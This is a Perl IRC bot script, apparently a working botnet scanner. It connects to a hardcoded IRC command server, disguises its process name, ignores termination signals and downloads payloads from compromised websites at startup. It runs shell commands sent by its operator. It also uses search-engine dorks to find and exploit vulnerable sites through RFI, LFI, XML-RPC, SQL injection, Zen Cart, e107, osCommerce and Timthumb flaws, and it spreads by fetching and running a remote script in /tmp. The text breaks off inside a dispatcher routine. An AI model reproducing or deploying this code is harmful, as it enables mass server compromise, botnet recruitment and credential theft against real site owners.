#!/usr/bin/perl

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use IO::Socket::INET;
use Socket;
use HTTP::Request::Common;
use LWP::Simple;
use LWP 5.64;
use HTTP::Request::Common qw(POST);
use Digest::MD5 qw(md5_hex);
use MIME::Base64;			       

my $datetime = localtime;

my $fakeproc  	= "/usr/bin/perl"; 
my $ircserver   = "cast.music24.kr";
my $ircport   	= "2000";
my $nickname  	= "cast";
my $ident     	= "cast";
my $channel   	= "#cast";
my $admin    	= "cast";
my $fullname  	= "cast";

my $zenlogo   = "15(4@12zen15)";
my $lfilogo   = "15(4@12LFI15)";
my $rfilogo   = "15(4@12RFI15)";
my $e107logo  = "15(4@12E10715)";
my $xmllogo   = "15(4@12XML15)";
my $sqllogo   = "15(4@12SQL15)";
my $oscologo   = "15(4@12OsCo15)";
my $timologo   = "15(4@12Timthumb15)";

my $rficmd    = '!rfi';
my $lficmd    = '!lfi';
my $xmlcmd    = '!xml';
my $zencmd    = '!zen';
my $sqlcmd    = '!sql';
my $e107cmd   = '!e107';
my $oscocmd   = '!osc';
my $timcmd    = '!tim';
my $cmdxml    = '!cmdxml';
my $cmdlfi    = '!cmdlfi';
my $cmde107   = '!cmde107';
my $lfispread = "cd /tmp;http://cast.music24.kr/tc/attach//os.jpg;perl os.jpg;rm -rf os*;fetch http://cast.music24.kr/tc/attach/os.jpg;perl os.jpg;rm -rf os*";
my $xmlspread = "cd /tmp;wget http://cast.music24.kr/tc/attach/os.jpg;perl os.jpg;rm -rf os*;fetch http://cast.music24.kr/tc/attach/os.jpg;perl os.jpg;rm -rf os*";


my $thumbshell  = "http://img.youtube.com.toptutor.hk/upload.php"; # uploader for timthumb
my $botshell  ="http://constantbio.com/wp-content/uploads/thumb-temp/in.txt";
my $botshell2 ="http://thenollywoodreport.com/wp-content/themes/Avenue/images/os.jpg";
my $folder1		= "/cache/1bc354b2dc42817a952135601b482606.php";											
my $folder2		= "/cache/external_1bc354b2dc42817a952135601b482606.php";									
my $folder3		= "/temp/1bc354b2dc42817a952135601b482606.php";												
my $folder4		= "/temp/external_1bc354b2dc42817a952135601b482606.php";									
my $folder5		= "/wp-content/uploads/thumb-temp/1bc354b2dc42817a952135601b482606.php";					
my $folderx1	= "/cache/1bc354b2dc42817a952135601b482606.php";											
my $folderx2	= "/cache/external_1bc354b2dc42817a952135601b482606.php";									
my $folderx3	= "/temp/1bc354b2dc42817a952135601b482606.php";												
my $folderx4	= "/temp/external_1bc354b2dc42817a952135601b482606.php";									
my $folderx5 	= "/wp-content/uploads/thumb-temp/1bc354b2dc42817a952135601b482606.php";
my $rfiid     = "http://e-pristore.com/shop/images/img/id.txt";
my $injector  = "http://thenollywoodreport.com/wp-content/themes/Avenue/images/copy.jpg";
my $bhlsprd   = "http://thenollywoodreport.com/wp-content/themes/Avenue/images/os.jpg";

my @uagents   = ("Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12","Mozilla/5.0 (Windows; U; Windows NT 5.1; pl-PL; rv:1.8.1.24pre) Gecko/20100228 K-Meleon/1.5.4","Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/540.0 (KHTML,like Gecko) Chrome/9.1.0.0 Safari/540.0","Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.5 (KHTML, like Gecko) Comodo_Dragon/4.1.1.11 Chrome/4.1.249.1042 Safari/532.5","Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16 Flock/2.5.6","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/533.1 (KHTML, like Gecko) Maxthon/3.0.8.2 Safari/533.1","Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.8.1.8pre) Gecko/20070928 Firefox/2.0.0.7 Navigator/9.0RC1","Opera/9.99 (Windows NT 5.1; U; pl) Presto/9.9.9","Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-HK) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5","Seamonkey-1.1.13-1(X11; U; GNU Fedora fc 10) Gecko/20081112","Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)","Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)");
my $uagent    = $uagents[rand(scalar(@uagents))];
my $lfdtest   = "../../../../../../../../../../../../../../../proc/self/environ%00";
my $lfdoutput = "root:(.+):(.+):(.+):(.+):(.+):(.+)";
my @tabele		= ('admin','tblUsers','tblAdmin','user','users','username','usernames','usuario',
					'name','names','nombre','nombres','usuarios','member','members','admin_table','miembro','miembros','membername','admins','administrator',
					'administrators','passwd','password','passwords','pass','Pass','tAdmin','tadmin','user_password','user_passwords','user_name','user_names',
					'member_password','mods','mod','moderators','moderator','user_email','user_emails','user_mail','user_mails','mail','emails','email','address',
					'e-mail','emailaddress','correo','correos','phpbb_users','log','logins','login','registers','register','usr','usrs','ps','pw','un','u_name','u_pass',
					'tpassword','tPassword','u_password','nick','nicks','manager','managers','administrador','tUser','tUsers','administradores','clave','login_id','pwd','pas','sistema_id',
					'sistema_usuario','sistema_password','contrasena','auth','key','senha','tb_admin','tb_administrator','tb_login','tb_logon','tb_members_tb_member',
					'tb_users','tb_user','tb_sys','sys','fazerlogon','logon','fazer','authorization','membros','utilizadores','staff','nuke_authors','accounts','account','accnts',
					'associated','accnt','customers','customer','membres','administrateur','utilisateur','tuser','tusers','utilisateurs','password','amministratore','god','God','authors',
					'asociado','asociados','autores','membername','autor','autores','Users','Admin','Members','Miembros','Usuario','Usuarios','ADMIN','USERS','USER','MEMBER','MEMBERS','USUARIO','USUARIOS','MIEMBROS','MIEMBRO');
my @kolumny		= ('admin_name','cla_adm','usu_adm','fazer','logon','fazerlogon','authorization','membros','utilizadores','sysadmin','email',
					'user_name','username','name','user','user_name','user_username','uname','user_uname','usern','user_usern','un','user_un','mail',
					'usrnm','user_usrnm','usr','usernm','user_usernm','nm','user_nm','login','u_name','nombre','login_id','usr','sistema_id','author',
					'sistema_usuario','auth','key','membername','nme','unme','psw','password','user_password','autores','pass_hash','hash','pass','correo',
					'userpass','user_pass','upw','pword','user_pword','passwd','user_passwd','passw','user_passw','pwrd','user_pwrd','pwd','authors',
					'user_pwd','u_pass','clave','usuario','contrasena','pas','sistema_password','autor','upassword','web_password','web_username');

$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
#$SIG{'PS'}    = 'IGNORE';

chdir("/");
chop (my $priper = `wget http://constantbio.com/wp-content/uploads/thumb-temp/in.txt -O blank.gif;wget http://thenollywoodreport.com/wp-content/themes/Avenue/images/copy.jpg -O tahu.jpg;wget http://thenollywoodreport.com/wp-content/themes/Avenue/images/copy.jpg -O bojo.jpg;wget http://thenollywoodreport.com/wp-content/themes/Avenue/images/copy.jpg -O loro.jpg`);
$ircserver = "$ARGV[0]" if $ARGV[0];
$0 = "$fakeproc"."\0" x 16;
my $pid = fork;
exit if $pid;
die "\n[!] Something Wrong !!!: $!\n\n" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();
sub sendraw {
    if ($#_ == '1') {
    my $socket = $_[0];
    print $socket "$_[1]\n";
    } else {
        print $IRC_cur_socket "$_[0]\n";
    }
}
my @domen = ("site:.org","site:.info","site:.net","site:.com","site:.edu","site:.mil","site:.int","site:.gov","site:.ac","site:.ad","site:.ae","site:.af","site:.ag","site:.ai","site:.al","site:.am","site:.an","site:.ao","site:.aq","site:.ar","site:.as","site:.asia","site:.at","site:.au","site:.aw","site:.ax","site:.az","site:.ba","site:.bb","site:.bd","site:.be","site:.bg","site:.bh","site:.bi","site:.bj","site:.bm","site:.bn","site:.bo","site:.br","site:.bs","site:.bt","site:.bw","site:.by","site:.bz","site:.ca","site:.cc","site:.cd","site:.cf","site:.cg","site:.ch","site:.ci","site:.ck","site:.cl","site:.cm","site:.cn","site:.co","site:.cr","site:.cu","site:.cv","site:.cx","site:.cy","site:.cz","site:.de","site:.dj","site:.dk","site:.dm","site:.do","site:.dz","site:.ec","site:.ee","site:.eg","site:.es","site:.eu","site:.fi","site:.fj","site:.fk","site:.fm","site:.fo","site:.fr","site:.gd","site:.ge","site:.gf","site:.gg","site:.gi","site:.gl","site:.gm","site:.gp","site:.gq","site:.gr","site:.gs","site:.gt","site:.gu","site:.gy","site:.hk","site:.hm","site:.hn","site:.hr","site:.ht","site:.hu","site:.id","site:.ie","site:.il","site:.im","site:.in","site:.io","site:.iq","site:.ir","site:.is","site:.it","site:.je","site:.jm","site:.jo","site:.jp","site:.ke","site:.kg","site:.kh","site:.ki","site:.km","site:.kn","site:.kr","site:.kw","site:.ky","site:.kz","site:.la","site:.lb","site:.lc","site:.li","site:.lk","site:.lr","site:.ls","site:.lt","site:.lu","site:.lv","site:.ly","site:.ma","site:.mc","site:.md","site:.me","site:.mg","site:.mk","site:.mo","site:.mn","site:.mp","site:.ms","site:.mt","site:.mu","site:.mv","site:.mw","site:.mx","site:.my","site:.mz","site:.na","site:.nc","site:.nf","site:.ng","site:.ni","site:.nl","site:.no","site:.nr","site:.nu","site:.nz","site:.om","site:.pa","site:.pe","site:.ph","site:.pg","site:.pk","site:.pl","site:.pn","site:.pr","site:.ps","site:.pt","site:.py","site:.qa","site:.re","site:.ro","site:.rs","site:.ru","site:.sa","site:.sb","site:.sd","site:.se","site:.sg","site:.sh","site:.si","site:.sk","site:.sl","site:.sm","site:.sn","site:.so","site:.sr","site:.st","site:.su","site:.sv","site:.sy","site:.sz","site:.tc","site:.tg","site:.th","site:.tj","site:.tk","site:.tn","site:.to","site:.tr","site:.tt","site:.tz","site:.tv","site:.tw","site:.ua","site:.ug","site:.uk","site:.us","site:.uy","site:.uz","site:.vc","site:.ve","site:.vg","site:.vi","site:.vn","site:.vu","site:.ws","site:.ye","site:.zm","site:.za","site:.zw");
sub connector {
    my $mynick = $_[0];
    my $ircserver_con = $_[1];
    my $ircport_con = $_[2];
    my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
    if (defined($IRC_socket)) {
        $IRC_cur_socket = $IRC_socket;
        $IRC_socket->autoflush(1);
        $sel_client->add($IRC_socket);
	$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
        $irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
        nick("$mynick");
        my $versi   = "(4New Auto Scanner)";
        sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$versi");
        sleep (1);}}
sub parse {
    my $servarg = shift;
    if ($servarg =~ /^PING \:(.*)/) {
        sendraw("PONG :$1");
    }
    elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
        if (lc($1) eq lc($mynick)) {
            $mynick = $4;
            $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        }
    }
    elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
        nick("$mynick".int rand(1));
    }
    elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
        $mynick = $2;
        $irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
        $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
        sendraw("MODE $mynick +Bx");
        sendraw("JOIN $channel");
        sleep(1);
        sendraw("PRIVMSG $admin :Hi $admin im here !!!");
    }
}
my $line_temp;
while( 1 ) {
    while (!(keys(%irc_servers))) { &connector("$nickname", "$ircserver", "$ircport"); }
    select(undef, undef, undef, 0.01);
    delete($irc_servers{''}) if (defined($irc_servers{''}));
    my @ready = $sel_client->can_read(0);
    next unless(@ready);
    foreach $fh (@ready) {
        $IRC_cur_socket = $fh;
        $mynick = $irc_servers{$IRC_cur_socket}{'nick'};
        $nread = sysread($fh, $ircmsg, 4096);
        if ($nread == 0) {
            $sel_client->remove($fh);
            $fh->close;
            delete($irc_servers{$fh});
        }
        @lines = split (/\n/, $ircmsg);
        $ircmsg =~ s/\r\n$//;

        if ($ircmsg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
            my ($nick,$ident,$host,$path,$msg) = ($1,$2,$3,$4,$5);
	    my $engine ="GooGLe,YahOoCA,YahOoUK,YahOoDE,YahOoFR,YahOoES,YahOoIT,YahOoHK,YahOoID,YahOoIN,YahOoAU,BingJP,BingCN,BingKR,BingMX,BingAR,BingCL,BingAU,ReDiff,Bing,ALtaViSTa,AsK,UoL,YahOo,CluSty,GutSer,GooGle2,ExaLead,LyCos,VirgiLio,WebDe,HotBot,AoL,SaPo,DuCk,LyGo,YauSe,BaiDu,KiPoT,GiBLa,BLacK";
            if ($path eq $mynick) {
                if ($msg =~ /^PING (.*)/) {
                    sendraw("NOTICE $nick :PING $1");
                }
                if ($msg =~ /^VERSION/) {
                    sendraw("NOTICE $nick :VERSION mIRC v6.17 Khaled Mardam-Bey");
                }
                if ($msg =~ /^TIME/) {
                    sendraw("NOTICE $nick :TIME ".$datetime."");
                }
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!nick (.+)/) {
                    sendraw("NICK ".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    sendraw($IRC_cur_socket, "PRIVMSG $nick :Fake Process/PID : $fakeproc - $$");
                }
                if (&isAdmin($nick) && $msg !~ /^!/) {
                    &shell("$nick","$msg");
                }
           }
            else {
                if (&isAdmin($nick) && $msg eq "!die") {
                    &shell("$path","kill -9 $$");
                }
                if (&isAdmin($nick) && $msg eq "!killall") {
                    &shell("$path","killall -9 perl");
                }
                if (&isAdmin($nick) && $msg eq "!reset") {
                    sendraw("QUIT :Restarting...");
                }
                if (&isAdmin($nick) && $msg =~ /^!join \#(.+)/) {
                    sendraw("JOIN #".$1);
                }
                if (&isAdmin($nick) && $msg eq "!part") {
                    sendraw("PART $path");
                }
                if (&isAdmin($nick) && $msg =~ /^!part \#(.+)/) {
                    sendraw("PART #".$1);
                }
                if (&isAdmin($nick) && $msg =~ /^\!x (.*)/) {
                    &shell("$path","$1");
                }
                if (&isAdmin($nick) && $msg =~ /^$mynick (.*)/) {
                    &shell("$path","$1");
                }
                ################################################################################# HELP COMMAND

                if ($msg=~ /^!help/) {
                    my $helplogo = "(Help)";
                    &msg("$path","$helplogo 15,1 $rficmd||15,1 $lficmd||15,1 $xmlcmd||15,1 $zencmd||15,1 $sqlcmd||15,1 $e107cmd [bug] [dork] 15,1");
					&msg("$path","$helplogo 15,1 $oscocmd [dork]||15,1 $timcmd [bug] [dork]15,1");
                    &msg("$admin","$helplogo 15,1 !autorfi||15,1 !autozen||15,1 !autoxml||15,1 !autolfd||15,1 !autosql||15,1 !autoe107 [bug] [dork] 15,1");
                    &msg("$path","$helplogo 15,1 $cmdlfi||15$cmdxml||15$cmde107 [target] [cmd] ");
					&msg("$path","$helplogo 4,1.14-4= 8wantexz4=14-4.");
				}
                if ($msg=~ /^!respon/ || $msg=~ /^!id/) {
                    if (&isFound($injector,"<?php")) {
                        &notice("$nick","(Injector)7 PHP Shell Good!");
                    } else {
                        &notice("$nick","(Injector)8 PHP Shell 4LOST!!!");
                    }
                }
				
				if ($msg=~ /^!respon/ || $msg=~ /^!id/) {
                    if (&isFound($thumbshell,"GIF89")) {
                        &notice("$nick","(thumbshell)7 thumbshell  Good!");
                    } else {
                        &notice("$nick","(thumbshell)8 thumbshell 4LOST!!!");
                    }
                }
                if (&isAdmin($nick) && $msg =~ /^!pid/) {
                    &notice("$nick","Fake Process/PID : $fakeproc - $$");
                }

		################################################################################# CMD Injector COMMANDS

		if ($msg=~ /^$cmdlfi\s+(.+?)\s+(.*)/){
		    my $url = $1."../../../../../../../../../../../../../../../proc/self/environ%00";
		    my $cmd = $2;
		    &cmdlfi($url,$cmd,$path);
		}
		if ($msg=~ /^$cmdxml\s+(.+?)\s+(.*)/){
		    my $url = $1;
		    my $cmd = $2;
		    &cmdxml($url,$cmd,$path);
		}
		if ($msg=~ /^$cmde107\s+(.+?)\s+(.*)/){
		    my $url = $1;
		    my $cmd = $2;
		    &cmde107($url,$cmd,$path);
		}

		################################################################################# RFI AUTO SCAN

		if ($msg=~ /^!autorfi\s+(.+?)\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($rfiid,"<?php")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","$rfilogo Dork :14 $dork");
                                &msg("$path","$rfilogo Bugz :14 $bug");
                                &msg("$path","$rfilogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,1);
                            } else {
                                &msg("$path","[ $nick ] $rfilogo 4PHP Shell Not Found!");
                            }
                        }
                    }    exit;
             }
	}
		################################################################################## RFI SCAN

                if ($msg=~ /^$rficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($rfiid,"<?php")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","$rfilogo Dork :14 $dork");
                                &msg("$path","$rfilogo Bugz :14 $bug");
                                &msg("$path","$rfilogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,1);
                            } else {
                                &msg("$path","[ $nick ] $rfilogo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }

		################################################################################# LFI AUTO SCAN

		if ($msg=~ /^!autolfi\s+(.+?)\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"<?php")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","$lfilogo Dork :14 $dork");
                                &msg("$path","$lfilogo Bugz :14 $bug");
                                &msg("$path","$lfilogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,2);
                            } else {
                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");
                            }
                        }
                    }    exit;
              }
	}

		################################################################################# LFI SCAN

                if ($msg=~ /^$lficmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"<?php")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","$lfilogo Dork :14 $dork");
                                &msg("$path","$lfilogo Bugz :14 $bug");
                                &msg("$path","$lfilogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,2);
                            } else {
                                &msg("$path","[ $nick ] $lfilogo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }

		################################################################################# XML AUTO SCAN

		if ($msg=~ /^!autoxml\s+(.+?)\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"<?php")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","$xmllogo Dork :14 $dork");
                                &msg("$path","$xmllogo Bugz :14 $bug");
                                &msg("$path","$xmllogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,3);
                            } else {
                                &msg("$path","[ $nick ] $xmllogo 4PHP Shell Not Found!");
                            }
                        }
                    }    exit;
              }
         }

		################################################################################# XML SCAN

		if ($msg=~ /^$xmlcmd\s+(.*?)\s+(.*)/ ) {
		    if (my $pid = fork) {
			waitpid($pid, 0);
		    }
		    else {
			if (fork) { exit; } else {
                            if (&isFound($injector,"<?php")) {
                                my ($bug,$dork) = ($1,$2);
                                &msg("$path","$xmllogo Dork :14 $dork");
                                &msg("$path","$xmllogo Bugz :14 $bug");
                                &msg("$path","$xmllogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,3);
                            } else {
                                &msg("$path","[ $nick ] $xmllogo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }

		################################################################################# LFD AUTO SCAN

		if ($msg=~ /!autozen\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"<?php")) {
                                my ($bug,$dork) = ("extras/curltest.php",$1,$domens);
                                &msg("$path","$zenlogo 9Dork :4 $dork");
                                &msg("$path","$zenlogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,4);
                            } else {
                                &msg("$path","[ $nick ] $zenlogo 4PHP Shell Not Found!");
                            }
                        }
                    }    exit;
              }
         }
		 
		 
		 
		 
		 if ($msg=~ /!autozencmd\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            my ($bug,$dork) = ("extras/ipn_test_return.php",$1);
                            &scan_start($path,$bug,$dork,$engine,4);
                        }
                        exit;
                    }
                }
			  }
			 

		################################################################################# LFD SCAN

                if ($msg=~ /^$zencmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("extras/curltest.php",$1);
                            &msg("$path","$zenlogo 9Dork :4 $dork");
                            &msg("$path","$zenlogo 13Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,4);
                        }
                        exit;
                    }
                }
				
				
				if ($msg=~ /^$zencmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ("extras/ipn_test_return.php",$1);
                            &scan_start($path,$bug,$dork,$engine,4);
                        }
                        exit;
                    }
                }

				
				############################################################### TIM
				if ($msg=~ /^$timcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$timlogo 0Dork :9 $dork");
                            &msg("$path","$timlogo 0Bugz :9 $bug");
                            &msg("$path","$timlogo 4,1Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,10);
                        }
                        exit;
                    }
                }					
            }
        }
		
		if ($msg=~ /^!autotim\s+(.+?)\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($thumbshell,"GIF89")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","$timlogo Dork :14 $dork");
                                &msg("$path","$timlogo Bugz :14 $bug");
                                &msg("$path","$timlogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,10);
                            } else {
                                &msg("$path","[ $nick ] $timlogo 4PHP Shell Not Found!");
                            }
                        }
                    }    exit;
              }
         }
		################################################################################# SQL AUTO SCAN

		if ($msg=~ /^!autosql\s+(.+?)\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"<?php")) {
                                my ($bug,$dork) = ($1,$2." ".$domens);
                                &msg("$path","$sqllogo Dork :14 $dork");
                                &msg("$path","$sqllogo Bugz :14 $bug");
                                &msg("$path","$sqllogo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,5);
                            } else {
                                &msg("$path","[ $nick ] $sqllogo 4PHP Shell Not Found!");
                            }
                        }
                    }    exit;
              }
         }

		################################################################################# SQL SCAN

                if ($msg=~ /^$sqlcmd\s+(.+?)\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            my ($bug,$dork) = ($1,$2);
                            &msg("$path","$sqllogo Dork :14 $dork");
                            &msg("$path","$sqllogo Bugz :14 $bug");
                            &msg("$path","$sqllogo 14Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,5);
                        }
                        exit;
                    }
                }

		################################################################################# E107 AUTO SCAN

		if ($msg=~ /^!autoe\s+(.+?)\s+(.*)/) {
			if (my $pid = fork) {
				waitpid($pid, 0);
					}
					else {
						foreach my $domends (@domen) { $domens = $domen[rand(scalar(@domen))];
						if (fork) {    exit; } else {
                            if (&isFound($injector,"<?php")) {
                                my ($bug,$dork) = ("contact.php",$2,$domens);
                                &msg("$path","$e107logo Dork :14 $dork");
                                &msg("$path","$e107logo Bugz :14 $bug");
                                &msg("$path","$e107logo 14Search Engine Loading ...");
                                &scan_start($path,$bug,$dork,$engine,6);
                            } else {
                                &msg("$path","[ $nick ] $e107logo 4PHP Shell Not Found!");
                            }
                        }
                    }    exit;
               }
         }

               if ($msg=~ /^$e107cmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"<?php")) {
                            my ($bug,$dork) = ("contact.php",$1);
                            &msg("$path","$e107logo 9Dork :4 $dork");
                            &msg("$path","$e107logo 3Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,6);
                        } else {
                            &msg("$path","[ $nick ] $oscologo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }

		 ##################################################################### OSCO SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"<?php")) {
                            my ($bug,$dork) = ("admin/categories.php/login.php",$1);
                            &msg("$path","$oscologo 9Dork :4 $dork");
                            &msg("$path","$oscologo 3Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,7);
                        } else {
                            &msg("$path","[ $nick ] $oscologo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }
                ##################################################################### OSCO2 SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"<?php")) {
                            my ($bug,$dork) = ("admin/file_manager.php/login.php",$1);
                            &scan_start($path,$bug,$dork,$engine,8);
                         } else {
                            &msg("$path","[ $nick ] $oscologo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }

                ##################################################################### OSCO3 SCAN

                if ($msg=~ /^$oscocmd\s+(.*)/) {
                    if (my $pid = fork) {
                        waitpid($pid, 0);
                    }
                    else {
                        if (fork) { exit; } else {
                            if (&isFound($injector,"<?php")) {
                            my ($bug,$dork) = ("admin/banner_manager.php/login.php",$1);
                            &msg("$path","$oscologo 9Dork :4 $dork");
                            &msg("$path","$oscologo 3Search Engine Loading ...");
                            &scan_start($path,$bug,$dork,$engine,9);
                        } else {
                            &msg("$path","[ $nick ] $oscologo 4PHP Shell Not Found!");
                            }
                        }
                        exit;
                    }
                }
		 
		 
		################################################################################# E107 SCAN


		################################################################################# 

            }
        }

        for(my $c=0; $c<= $#lines; $c++) {
            $line = $lines[$c];
            $line = $line_temp.$line if ($line_temp);
            $line_temp = '';
            $line =~ s/\r$//;
            unless ($c == $#lines) {
                &parse("$line");
            } else {
                if ($#lines == 0) {
                    &parse("$line");
                } elsif ($lines[$c] =~ /\r$/) {
                    &parse("$line");
                } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
                    &parse("$line");
                } else {
                    $line_temp = $line;
                }
            }
        }

#########################################

sub type () {
my ($chan,$bug,$dork,$engine,$type) = @_;
	if ($type == 1){$type=&rfi($chan,$bug,$dork,$engine);}
     elsif ($type == 2){$type=&lfi($chan,$bug,$dork,$engine);}
     elsif ($type == 3){$type=&xml($chan,$bug,$dork,$engine);}
     elsif ($type == 4){$type=&zen($chan,$bug,$dork,$engine);}
     elsif ($type == 5){$type=&sql($chan,$bug,$dork,$engine);}
     elsif ($type == 6){$type=&e107($chan,$bug,$dork,$engine);}
	 elsif ($type == 7){$type=&osco($chan,$bug,$dork,$engine);}
	 elsif ($type == 8){$type=&osco2($chan,$bug,$dork,$engine);}
	 elsif ($type == 9){$type=&osco3($chan,$bug,$dork,$engine);}
